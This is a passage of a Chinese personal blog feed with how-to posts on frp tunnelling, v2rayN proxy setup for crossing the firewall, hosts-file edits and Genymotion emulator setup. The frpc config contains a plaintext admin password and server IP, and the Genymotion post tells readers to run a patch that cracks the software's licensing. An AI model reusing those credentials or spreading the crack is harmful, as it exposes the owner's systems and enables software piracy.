class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">## 对应的您的服务器的ip地址和端口号，端口号是上面的&#96;frps.ini&#96;中配置的&#96;port&#96;参数</span><br><span class="line">server_addr &#x3D; 34.69.204.193</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 与服务器端通信协议</span><br><span class="line"># 支持 tcp and kcp and websocket, 默认是 tcp</span><br><span class="line">protocol &#x3D; tcp</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"></span><br><span class="line"># 记录日志</span><br><span class="line">log_file &#x3D; &#x2F;opt&#x2F;frp&#x2F;logs&#x2F;frpc.log</span><br><span class="line">log_level &#x3D; info</span><br><span class="line">log_max_days &#x3D; 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">admin_port &#x3D; 7400</span><br><span class="line">admin_user &#x3D; alterhu2020</span><br><span class="line">admin_pwd &#x3D; guchan102620</span><br><span class="line"># ssh访问</span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br><span class="line"># -----------------------------域名配置---------------------------</span><br><span class="line"># 1. 通过域名访问设置,默认的remote_port已经在frps中设置</span><br><span class="line">[www.http]</span><br><span class="line">type &#x3D; http</span><br><span class="line">use_encryption &#x3D; false</span><br><span class="line">use_compression &#x3D; true</span><br><span class="line"></span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 3000</span><br><span class="line">custom_domains&#x3D; www.seniortesting.club,seniortesting.club</span><br><span class="line"></span><br><span class="line"># 2. code.seniortesting.club博客网站</span><br><span class="line">[blog.http]</span><br><span class="line">type &#x3D; http</span><br><span class="line">use_encryption &#x3D; false</span><br><span class="line">use_compression &#x3D; true</span><br><span class="line"></span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80</span><br><span class="line">custom_domains&#x3D; code.seniortesting.club</span><br><span class="line"></span><br><span class="line"># 3. doc.seniortesting.club文档网址</span><br><span class="line">[doc.http]</span><br><span class="line">type &#x3D; http</span><br><span class="line">use_encryption &#x3D; false</span><br><span class="line">use_compression &#x3D; true</span><br><span class="line"></span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 3007</span><br><span class="line">custom_domains&#x3D; doc.seniortesting.club</span><br><span class="line"></span><br><span class="line"># 4. jvfast.seniortesting.club演示网站</span><br><span class="line">[jvfast.http]</span><br><span class="line">type &#x3D; http</span><br><span class="line">use_encryption &#x3D; false</span><br><span class="line">use_compression &#x3D; true</span><br><span class="line"></span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 3006</span><br><span class="line">custom_domains&#x3D; jvfast.seniortesting.club</span><br><span class="line"></span><br><span class="line"># 5. 后台接口open.seniortesting.club配置</span><br><span class="line">[open.http]</span><br><span class="line">type &#x3D; http</span><br><span class="line">use_encryption &#x3D; false</span><br><span class="line">use_compression &#x3D; true</span><br><span class="line"></span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 9090</span><br><span class="line">custom_domains &#x3D; open.seniortesting.club</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;服务端配置&quot;&gt;&lt;a href=&quot;#服务端配置&quot; class=&quot;headerlink&quot; title=&quot;服务端配置&quot;&gt;&lt;/a&gt;服务端配置&lt;/h2&gt;&lt;h2 id=&quot;frps-ini配置文件&quot;&gt;&lt;a href=&quot;#frps-ini配置文件&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    <category term="翻墙" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E7%BF%BB%E5%A2%99/"/>
    
    
  </entry>
  
  <entry>
    <title>v2rayN操作使用说明</title>
    <link href="https://seniortesting.club/posts/HeLF4SMT9c/"/>
    <id>https://seniortesting.club/posts/HeLF4SMT9c/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务器地址更新"><a href="#服务器地址更新" class="headerlink" title="服务器地址更新"></a>服务器地址更新</h2><ul><li><h3 id="2020年4月18日"><a href="#2020年4月18日" class="headerlink" title="2020年4月18日"></a>2020年4月18日</h3></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmess:&#x2F;&#x2F;ew0KICAidiI6ICIyIiwNCiAgInBzIjogIiIsDQogICJhZGQiOiAic3R1ZHkucGluZ2Jvb2sudG9wIiwNCiAgInBvcnQiOiAiNTY3ODkiLA0KICAiaWQiOiAiZGY1MDg2NzItN2ZkOS0xMWVhLThlOWMtNTYwMDAyYjAyMDU2IiwNCiAgImFpZCI6ICIxNiIsDQogICJuZXQiOiAid3MiLA0KICAidHlwZSI6ICJub25lIiwNCiAgImhvc3QiOiAic3R1ZHkucGluZ2Jvb2sudG9wIiwNCiAgInBhdGgiOiAiLzBwVUdZbnpoLyIsDQogICJ0bHMiOiAidGxzIg0KfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li><p>请不要在外网发布任何违法不当言论，虽然我们自己搭建的服务器数据传输是加密的。但是现在有很多小粉红和五毛党混迹与各大国外社交媒体，他可以根据你的个人社交媒体相关信息来调查你的个人信息。进而可能会锁定你。</p></li><li><p>因为强大的防火墙每天会巡视所有的网络信息，所以不可避免随时IP被封。如果遇到无法连接的问题，请告诉我来进行处理切换。</p></li></ol><h2 id="1-下载客户端"><a href="#1-下载客户端" class="headerlink" title="1. 下载客户端"></a>1. 下载客户端</h2><p>以下的翻墙客户端是针对<strong>Windows</strong>操作系统的客户端（WindowXP,Windows 7,Windows 10)，如果需要其他平台的客户端，可以参考如下进行下载相关平台客户端,也可直接谷歌搜索”v2ray客户端”查看符合你要求的客户端。</p><ul><li>Mac苹果电脑客户端: <a href="https://github.com/yanue/V2rayU" target="_blank" rel="noopener">V2rayU</a></li><li>安卓手机客户端: <a href="https://github.com/2dust/v2rayNG/releases" target="_blank" rel="noopener">V2rayNG</a></li><li>苹果手机客户端: 目前苹果App Store管理太严，以前的基本不能使用已经下架。如果真的特别需要使用,请电脑端搜索苹果手机客户端。</li></ul><h3 id="1-1-百度网盘下载"><a href="#1-1-百度网盘下载" class="headerlink" title="1.1 百度网盘下载"></a>1.1 百度网盘下载</h3><p>点击此处下载客户端，<a href="https://pan.baidu.com/s/13K1OkNSba-27yxlRm75jiA" target="_blank" rel="noopener">V2rayN客户端百度网盘下载，提取码: 9mop</a></p><h3 id="1-2-GitHub下载"><a href="#1-2-GitHub下载" class="headerlink" title="1.2 GitHub下载"></a>1.2 GitHub下载</h3><ol><li>访问V2rayN的地址： <a href="https://github.com/2dust/v2rayN/releases" target="_blank" rel="noopener">https://github.com/2dust/v2rayN/releases</a></li><li>查看最新版本，当前显示的最新版本是: 3.14,然后点击”v2rayN-Core.zip”文件下载即可</li></ol><h2 id="2-客户端配置"><a href="#2-客户端配置" class="headerlink" title="2. 客户端配置"></a>2. 客户端配置</h2><ol><li><p>将以上下载的zip压缩包文件解压到任意目录下面，例如 <strong>D:\v2rayN-Core</strong></p></li><li><p>进入目录： <strong>D:\v2rayN-Core</strong>,点击: <strong>v2rayN.exe</strong> 文件，如果没有看到V2rayN的界面，查看任务栏的隐藏图标，点击V2rayN打开软件界面；<br>图标类似于小飞机，如下：<br><img src="https://s1.ax1x.com/2020/04/15/JCGQsO.png" alt="图标"></p></li><li><p>点击图标打开软件界面，如下截图：<br><img src="https://s1.ax1x.com/2020/04/15/JCG7k9.png" alt="主界面"></p></li><li><p>复制如下服务器配置信息（Ctrl+C复制)：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmess:&#x2F;&#x2F;eyJ2IjogIjIiLCAicHMiOiAiIiwgImFkZCI6ICI0NS43Ny41MS4yMjMiLCAicG9ydCI6IDQxMDA4LCAiYWlkIjogMTYsICJ0eXBlIjogImR0bHMiLCAibmV0IjogImtjcCIsICJwYXRoIjogIiIsICJob3N0IjogIiIsICJpZCI6ICJlZjAwZmFlYy03ZWUwLTExZWEtODY1Ny01NjAwMDJhZjY2NzMiLCAidGxzIjogIm5vbmUifQ&#x3D;&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li>点击工具栏的“服务器”图标，选择“从剪切板导入批量URL”,如下截图：</li></ol><p><img src="https://s1.ax1x.com/2020/04/15/JCJlpq.png" alt="选择界面"></p><ol start="6"><li><p>完成上面的操作后可以看到主界面的列表里面新增了该条服务器配置信息，分别点击工具栏中的“重启服务”，然后再点击“检查更新”，在下拉框中选择“PAC”,如下截图：<br><img src="https://s1.ax1x.com/2020/04/15/JCYaqS.png" alt="选择PAC"><br>这个操作会从服务器拉去配置信息，根据你的浏览网页访问地址信息判断访问的是国内的防火墙的网站还是国外的网站，国外的网站将会直接走服务器访问，国内的不走服务器访问。</p></li><li><p>如果上面的操作没有任何问题会在控制台看到信息“PAC更新成功”，如下截图：<br><img src="https://s1.ax1x.com/2020/04/15/JCtPQP.png" alt="pac更新成功"></p></li><li><p>以上的配置完成后基本可以上网，你还需要配置一下其他信息，右键刚才的小飞机图标会弹出V2rayN的功能列表.如下截图：<br><img src="https://s1.ax1x.com/2020/04/15/JCthOf.png" alt="小飞机功能"></p></li><li><p>点击上面的小飞机功能列表，点击“Http代理”,选择“开启PAC,并自动配置系统代理(PAC模式）”，如下截图：</p></li></ol><p><img src="https://s1.ax1x.com/2020/04/15/JCN8jP.png" alt="pac设置"></p><p>这里提下有关翻墙代理的几个概念：</p><ol><li>全局模式，表示当前的机器所有的联网都走服务器翻墙代理，不管是上网还是QQ,还是上国内的网站；</li><li>PAC模式，表示Proxy Auto Config,代理会自动智能根据当前的访问ip判断访问的是国内网站还是国外网站，国外的会走我们的服务器代理，国内的不会走代理翻墙。</li></ol><p>一般情况下我们选择设置为 “PAC模式”即可。这样国内的网站访问不会走代理也不会耗流量；</p><ol start="10"><li>在上面的小飞机功能列表上点击“服务器”，确认选择的服务是“Vmess-45***223:41008”类似这样的服务器，我们的服务器IP是：45.77.51.223 ,如下截图：<br><img src="https://s1.ax1x.com/2020/04/15/JCaLpd.png" alt="vmess配置"></li></ol><h2 id="3-额外配置"><a href="#3-额外配置" class="headerlink" title="3. 额外配置"></a>3. 额外配置</h2><ol><li><p>可以在“V2rayN”的主界面，点击工具栏的“参数设置”, 勾选“开启UDP”,”开启流量监测”，如下截图：<br><img src="https://s1.ax1x.com/2020/04/15/JCwaq0.png" alt="简单配置"></p></li><li><p>可以在“v2rayN”的主界面，设置开机自动启动“V2rayN”客户端，以后只需要开机，不需要任意设置，既可翻墙。如下截图：</p></li></ol><p><img src="https://s1.ax1x.com/2020/04/15/JC0VoT.png" alt="开机启动"></p><h2 id="4-其他问题"><a href="#4-其他问题" class="headerlink" title="4. 其他问题"></a>4. 其他问题</h2><h3 id="基础连接已经关闭-发送时发生错误"><a href="#基础连接已经关闭-发送时发生错误" class="headerlink" title="基础连接已经关闭: 发送时发生错误"></a>基础连接已经关闭: 发送时发生错误</h3><ol><li>因为core源在github上,所以更新是需要开启http代理，能够访问Github. 粘贴如下配置信息到Windows的<code>hosts</code>配置文件中(文件位于： “C:\Windows\System32\drivers\etc\hosts”),直接复制如下代码到文件末尾:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># github</span><br><span class="line">140.82.112.3 github.com</span><br><span class="line">199.232.69.194 github.global.ssl.fastly.net</span><br><span class="line">140.82.114.10 codeload.github.com</span><br></pre></td></tr></table></figure><ol start="2"><li>可能端口已经被拦截</li></ol><p>需要更换服务器端的端口号，可能端口号已经被封。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;服务器地址更新&quot;&gt;&lt;a href=&quot;#服务器地址更新&quot; class=&quot;headerlink&quot; title=&quot;服务器地址更新&quot;&gt;&lt;/a&gt;服务器地址更新&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;2020年4月18日&quot;&gt;&lt;a href=&quot;#2020年4月18日&quot; cl</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    <category term="翻墙" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E7%BF%BB%E5%A2%99/"/>
    
    
  </entry>
  
  <entry>
    <title>可用的科学上网,翻墙方式(2019年最新更新)</title>
    <link href="https://seniortesting.club/posts/NkGz6i8gIG/"/>
    <id>https://seniortesting.club/posts/NkGz6i8gIG/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="可用的科学上网方式-2019年最新更新"><a href="#可用的科学上网方式-2019年最新更新" class="headerlink" title="可用的科学上网方式,2019年最新更新"></a>可用的科学上网方式,2019年最新更新</h2><p>也许你像大多人国人一样,一直在到处搜索查找可用的科学上网工具,因为你发现强大的防火墙总是时不时的把你用的好好的一些上网工具禁止了. 我这里推荐大家的方式是一个方法,不是特定的下载工具,因为很多工具可能过段时间就不能使用了.另外说明,我不是反对国内的防火墙的,反而翻墙后我更爱国.这个方式只是我们用于学习研究的,请不要用于其他非法用途.</p><ol><li>首先访问网站: <a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>, 然后搜索”翻墙”,或者”科学上网”,里面会有一堆推荐的科学上网工具,我们按照stars最多的来排序,因为star最多说明这个工具好用,得到了很多人的认可.另外大家都在用,也可以保证工具的更新更加频繁,这是翻墙工具很重要的一点,更新一定要频繁. 我这里搜索的结果如下:</li></ol><h2 id="gist-github-被墙-国内不能访问"><a href="#gist-github-被墙-国内不能访问" class="headerlink" title="gist github 被墙 国内不能访问"></a>gist github 被墙 国内不能访问</h2><p>经常在Github上逛得人会发现我们可以直接访问Github,但是gist.github.com却不能访问,解决办法是:在windows下打开<code>C:\Windows\System32\drivers\etc\hosts</code>文件,用编辑器打开，在最后行添加如下记录:</p><pre><code>192.30.253.118 gist.github.com</code></pre><p>保存,然后打开: <a href="https://gist.github.com/" target="_blank" rel="noopener">https://gist.github.com/</a> 就可以访问了.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;可用的科学上网方式-2019年最新更新&quot;&gt;&lt;a href=&quot;#可用的科学上网方式-2019年最新更新&quot; class=&quot;headerlink&quot; title=&quot;可用的科学上网方式,2019年最新更新&quot;&gt;&lt;/a&gt;可用的科学上网方式,2019年最新更新&lt;/h2&gt;&lt;p&gt;也许</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    <category term="翻墙" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E7%BF%BB%E5%A2%99/"/>
    
    
  </entry>
  
  <entry>
    <title>最新genymotion3资源下载及其配置</title>
    <link href="https://seniortesting.club/posts/CyUuhFKapi/"/>
    <id>https://seniortesting.club/posts/CyUuhFKapi/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="genymotion介绍"><a href="#genymotion介绍" class="headerlink" title="genymotion介绍"></a>genymotion介绍</h2><p>genymotion破解版是一款为用户提供最稳定Android虚拟环境的手机模拟器，我们不仅可以通过Genymotion模拟器在电脑上操作安卓系统进行使用。同时还可以安装各种手机APP和手机游戏进行体验，这样你就可以通过电脑来玩各种手游，非常方便。</p><p>注意: <strong>目前只有genymotion2.12.0的可以破解，其他的3.0版本的截至到目前2020年7月25日还是没有公开看到破解版的。就不要谷歌搜索相关的破解文件了。</strong><a href="https://www.ghpym.com/genymotion.html" target="_blank" rel="noopener">https://www.ghpym.com/genymotion.html</a></p><p>下载附件中的压缩文件，先点击： genymotion-2.12.0.exe进行安装genymotion这个版本的是没有安装virtualbox的，你需要再单独安装virtualbox.安装完成后不要立即打开genymation. 然后复制文件genymotion2.x-patch.exe到genymotion的安装目录，双击该破解文件进行破解。</p><p><strong>该破解版可以安装android8.0，这个相对于国内哪些安卓模拟器还是5.0算是很了不起了。而且他启动更快，性能更好。</strong></p><h2 id="安装虚拟设备很难下载"><a href="#安装虚拟设备很难下载" class="headerlink" title="安装虚拟设备很难下载"></a>安装虚拟设备很难下载</h2><p>Genymotion ova下载的url地址为：<a href="http://dl.genymotion.com/dists/xxx/ova/xxxxxx,%E5%8F%AF%E5%A4%8D%E5%88%B6%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%E5%88%B0%E8%BF%85%E9%9B%B7%E4%B8%AD%E4%B8%8B%E8%BD%BD%EF%BC%8C%E9%80%9F%E5%BA%A6%E4%BC%9A%E5%BF%AB%E5%BE%88%E5%A4%9A,%E5%85%B6%E4%B8%ADxxx%E4%B8%BA%E8%99%9A%E6%8B%9F%E8%AE%BE%E5%A4%87%E5%AF%B9%E5%BA%94%E7%9A%84Android%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%B7,%E5%A6%824.2.2,7.0.0(4.3%E5%88%99xxx%E4%B8%BA4.3,5.0%E5%88%99xxx%E4%B8%BA5.0.0,8.0%E5%88%99xxx%E4%B8%BA8.0)%EF%BC%8Cxxxxxx%E4%B8%BAova" target="_blank" rel="noopener">http://dl.genymotion.com/dists/xxx/ova/xxxxxx,可复制下载地址到迅雷中下载，速度会快很多,其中xxx为虚拟设备对应的Android系统版本号,如4.2.2,7.0.0(4.3则xxx为4.3,5.0则xxx为5.0.0,8.0则xxx为8.0)，xxxxxx为ova</a>的文件名，如:</p><p>（F:\genymotion）</p><p><a href="http://dl.genymotion.com/dists/4.2.2/ova/genymotion_vbox86p_4.2_180130_203606.ova" target="_blank" rel="noopener">http://dl.genymotion.com/dists/4.2.2/ova/genymotion_vbox86p_4.2_180130_203606.ova</a></p><p><a href="http://dl.genymotion.com/dists/4.3/ova/genymotion_vbox86p_4.3_180130_212946.ova" target="_blank" rel="noopener">http://dl.genymotion.com/dists/4.3/ova/genymotion_vbox86p_4.3_180130_212946.ova</a></p><p><a href="http://dl.genymotion.com/dists/7.0.0/ova/genymotion_vbox86p_7.0_180216_000000.ova" target="_blank" rel="noopener">http://dl.genymotion.com/dists/7.0.0/ova/genymotion_vbox86p_7.0_180216_000000.ova</a></p><p>此处提供一个github的资源目录对应的各个ova文件，找到合适的直接下载即可： <a href="https://gist.github.com/runo280/e4be3e04c24b463b55ddf012c5cfbdc4" target="_blank" rel="noopener">https://gist.github.com/runo280/e4be3e04c24b463b55ddf012c5cfbdc4</a></p><p>然后将下载的ova文件复制到下方对应的各个系统的目录。 例如我的目录是: <a href="C:\Users\Administrator\AppData\Local\Genymobile\Genymotion\ova">C:\Users\Administrator\AppData\Local\Genymobile\Genymotion\ova</a></p><ol><li>Windows系统复制这些ova到<code>C:\Users\xxx\AppData\Local\Genymobile\Genymotion\ova</code></li><li>Mac OS对应的目录为<code>/User/xxx/.Genymobile/Genymotion/ova</code></li><li>Ubuntu对应的目录为<code>/home/xxx/.Genymobile/Genymotion/ova</code></li></ol><p>其中xxx为本地计算机的用户名，如果出现联机下载的情况，可能是Genymotion后台对应的ova文件名称改变了，下载的文件名可在<a href="C:\Users\Administrator\AppData\Local\Genymobile\Genymotion\ova">C:\Users\xxx\AppData\Local\Genymobile\Genymotion\ova</a>目录下查看</p><p>启动Genymotion,选择Add,在Select a new virtual device界面上选择模拟器名称，如：Samsung Galaxy S6 - 5.1.0 - API 22 - 1440x2560</p><p>或者打开对应的virtualbox，直接选择“新建”-》“引入虚拟机”，选择刚才下载的ova虚拟机文件导入即可。</p><h2 id="虚拟设备无法上网"><a href="#虚拟设备无法上网" class="headerlink" title="虚拟设备无法上网"></a>虚拟设备无法上网</h2><p>解决办法:打开VirtualBox,进行如下设置：</p><p>网卡1设置为: 仅主机(Host-Only)网络,网卡2设置为:网络地址转换(NAT),网卡3设置为: 仅主机(Host-Only)网络,网卡4设置为: 仅主机(Host-Only)网络,大部分情况下不需要对网卡3和网卡4做设置，使用默认设置即可，如不能上网，再尝试设置网卡3和网卡4。</p><h2 id="不支持x86体系apk"><a href="#不支持x86体系apk" class="headerlink" title="不支持x86体系apk"></a>不支持x86体系apk</h2><p>需要下载安装文件： <a href="https://github.com/m9rco/Genymotion_ARM_Translation/tree/master/package" target="_blank" rel="noopener">Genymotion-ARM-Translation-Tool</a>,目前各个版本的android对应不同的安装包。所有的安装包如下：<br><a href="https://github.com/m9rco/Genymotion_ARM_Translation/tree/master/package" target="_blank" rel="noopener">https://github.com/m9rco/Genymotion_ARM_Translation/tree/master/package</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;genymotion介绍&quot;&gt;&lt;a href=&quot;#genymotion介绍&quot; class=&quot;headerlink&quot; title=&quot;genymotion介绍&quot;&gt;&lt;/a&gt;genymotion介绍&lt;/h2&gt;&lt;p&gt;genymotion破解版是一款为用户提供最稳定Androi</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    <category term="虚拟机" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>genymotion工具问题整理</title>
    <link href="https://seniortesting.club/posts/GDBxruHnFk/"/>
    <id>https://seniortesting.club/posts/GDBxruHnFk/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><h3 id="Ionic-闲置材料商城"><a href="#Ionic-闲置材料商城" class="headerlink" title="Ionic 闲置材料商城"></a>Ionic 闲置材料商城</h3><p>参考：<a href="https://github.com/search?o=desc&q=ionic%E5%95%86%E5%9F%8E&s=updated&type=Repositories" target="_blank" rel="noopener">github ionic源码商城</a></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="How-to-make-a-transparent-tbm-header-toolbar"><a href="#How-to-make-a-transparent-tbm-header-toolbar" class="headerlink" title="How to make a transparent(tbm ) header / toolbar?"></a>How to make a transparent(tbm ) header / toolbar?</h3><p>针对Ionic2可以参考如下链接: <a href="https://www.joshmorony.com/create-a-stylish-news-feed-layout-in-ionic-2/" target="_blank" rel="noopener">Create a Stylish News Feed Layout in Ionic 2 &amp; 3</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ion-header</span> <span class="attr">translucent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> &lt;ion-content</span><br><span class="line">      no-padding</span><br><span class="line">      fullscreen</span><br><span class="line">      :scrollEvents=&quot;true&quot; @ionScroll=&quot;scrollContent&quot;&gt;</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-content</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="mapGetters-mapState-都放在computed里面作为计算属性"><a href="#mapGetters-mapState-都放在computed里面作为计算属性" class="headerlink" title="mapGetters,mapState 都放在computed里面作为计算属性"></a><code>mapGetters</code>,<code>mapState</code> 都放在computed里面作为计算属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">    ...mapState(&#123;</span><br><span class="line">        islogged: state&#x3D;&gt;state.user.islogged</span><br><span class="line">    &#125;),</span><br><span class="line">    ...mapGetters([&#39;islogged&#39;])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="genymotion的虚拟机不能现在在android-studio的device列表中"><a href="#genymotion的虚拟机不能现在在android-studio的device列表中" class="headerlink" title="genymotion的虚拟机不能现在在android studio的device列表中"></a>genymotion的虚拟机不能现在在android studio的device列表中</h3><p><a href="https://stackoverflow.com/questions/36142055/genymotion-device-doesnt-appear-on-device-chooser-android-studio" target="_blank" rel="noopener">https://stackoverflow.com/questions/36142055/genymotion-device-doesnt-appear-on-device-chooser-android-studio</a></p><ul><li>click the run button to compile project</li><li>device empty list appear</li><li>start genymotion</li><li>device will appear in the list</li></ul><h3 id="genymotion拖动apk文件出现错误：-an-error-occurred-while-deploying-the-file"><a href="#genymotion拖动apk文件出现错误：-an-error-occurred-while-deploying-the-file" class="headerlink" title="genymotion拖动apk文件出现错误： an error occurred while deploying the file"></a>genymotion拖动apk文件出现错误： an error occurred while deploying the file</h3><blockquote><p>原来是genymotion对应的adb于Android sdk中的adb版本不兼容的问题，换成genymotion内置的adb是没有问题的，所以升级genymotion到3.0，然后升级对应的android sdk到对应的版本即可。</p></blockquote><h3 id="Genymotion-的android-9-0-可以使用-Android-8-1-的-ARM-Translation-Oreo-android8-，测试可用。没有找到最新的Android-9-0-的arm-translation"><a href="#Genymotion-的android-9-0-可以使用-Android-8-1-的-ARM-Translation-Oreo-android8-，测试可用。没有找到最新的Android-9-0-的arm-translation" class="headerlink" title="Genymotion 的android 9.0 可以使用 Android 8.1 的 ARM_Translation_Oreo_android8 ，测试可用。没有找到最新的Android 9.0 的arm translation"></a>Genymotion 的android 9.0 可以使用 Android 8.1 的 ARM_Translation_Oreo_android8 ，测试可用。没有找到最新的Android 9.0 的arm translation</h3><h3 id="无法加载webgl"><a href="#无法加载webgl" class="headerlink" title="无法加载webgl"></a>无法加载webgl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">IconLoader: Could not find icon drawable from resource</span><br><span class="line">    